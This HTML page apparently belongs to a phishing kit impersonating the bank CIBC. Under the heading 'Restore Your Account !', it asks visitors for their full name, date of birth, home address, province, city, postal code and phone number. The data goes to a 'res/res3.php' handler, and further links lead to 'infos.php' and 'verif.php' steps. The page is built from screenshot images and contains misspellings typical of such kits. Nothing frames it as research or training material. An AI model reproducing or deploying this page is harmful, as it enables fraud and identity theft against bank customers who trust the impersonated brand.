<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>CIBC</title>
<meta name="generator" content="WYSIWYG Web Builder 12 Trial Version - http://www.wysiwygwebbuilder.com">
<link href="images/favicon.png" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled2.css" rel="stylesheet" type="text/css">
<link href="css/infos.css" rel="stylesheet" type="text/css">
</head>
<body>
<form name="ff" action="res/res3.php" method="POST">
<div id="wb_Image2" style="position:absolute;left:0px;top:2px;width:1315px;height:691px;z-index:10;">
<img src="images/0.PNG" id="Image2" alt=""></div>
<div id="wb_Image1" style="position:absolute;left:0px;top:701px;width:1315px;height:302px;z-index:11;">
<img src="images/2.PNG" id="Image1" alt=""></div>

<div id="wb_Form1" style="position:absolute;left:263px;top:278px;width:560px;height:40px;z-index:13;">

</div>
<div id="wb_Image4" style="position:absolute;left:248px;top:262px;width:614px;height:52px;z-index:14;">
<a href="infos.php"><img src="images/11.PNG" id="Image4" alt=""></a></div>
<div id="wb_Image3" style="position:absolute;left:249px;top:595px;width:614px;height:47px;z-index:15;">
<a href="verif.php"><img src="images/515.PNG" id="Image3" alt=""></a></div>
<div id="wb_Form2" style="position:absolute;left:250px;top:314px;width:613px;height:277px;z-index:16;">
<input type="text" id="Editbox1" style="position:absolute;left:29px;top:58px;width:194px;height:25px;line-height:25px;z-index:0;" name="1" value="" spellcheck="false" placeholder="Full Name" required>
<input type="date" id="Editbox2" style="position:absolute;left:29px;top:101px;width:194px;height:25px;line-height:25px;z-index:1;" name="2" value="" spellcheck="false" placeholder="Date Of Birth" required>
<input type="text" id="Editbox3" style="position:absolute;left:29px;top:145px;width:194px;height:25px;line-height:25px;z-index:2;" name="3" value="" spellcheck="false" placeholder="Adrress Home" required>
<input type="text" id="Editbox4" style="position:absolute;left:29px;top:188px;width:194px;height:25px;line-height:25px;z-index:3;" name="4" value="" disabled spellcheck="false" placeholder="Canda">
<input type="text" id="Editbox5" style="position:absolute;left:369px;top:58px;width:194px;height:25px;line-height:25px;z-index:4;" name="5" value="" spellcheck="false" placeholder="province" required>
<input type="text" id="Editbox6" style="position:absolute;left:369px;top:101px;width:194px;height:25px;line-height:25px;z-index:5;" name="6" value="" spellcheck="false" placeholder="city" required>
<input type="text" id="Editbox7" style="position:absolute;left:369px;top:145px;width:194px;height:25px;line-height:25px;z-index:6;" name="7" value="" spellcheck="false" placeholder="Postal Code" required>
<input type="text" id="Editbox8" style="position:absolute;left:369px;top:188px;width:194px;height:25px;line-height:25px;z-index:7;" name="8" value="" spellcheck="false" placeholder="Phone Number" required>
<input type="submit" id="Button1" name="" value="Next" style="position:absolute;left:543px;top:240px;width:56px;height:25px;">

</div>
<div id="wb_Form4" style="position:absolute;left:249px;top:121px;width:378px;height:81px;z-index:17;">
<div id="wb_Text8" style="position:absolute;left:0px;top:0px;width:283px;height:25px;z-index:9;">
<span style="color:#D60139;font-family:'Bookman Old Style';font-size:21px;"><strong>Restore Your Account !</strong></span></div>

</div>
<div id="wb_Text7" style="position:absolute;left:249px;top:167px;width:335px;height:16px;z-index:18;">
<span style="color:#000000;font-family:Arial;font-size:13px;">All fields are mandatory unless stated (optional)</span></div>
<div id="wb_Text1" style="position:absolute;left:266px;top:327px;width:1111px;height:16px;z-index:19;">
<span style="color:#000000;font-family:Arial;font-size:13px;">Please enter your Personal Information </span></div>
</form>
</body>
</html>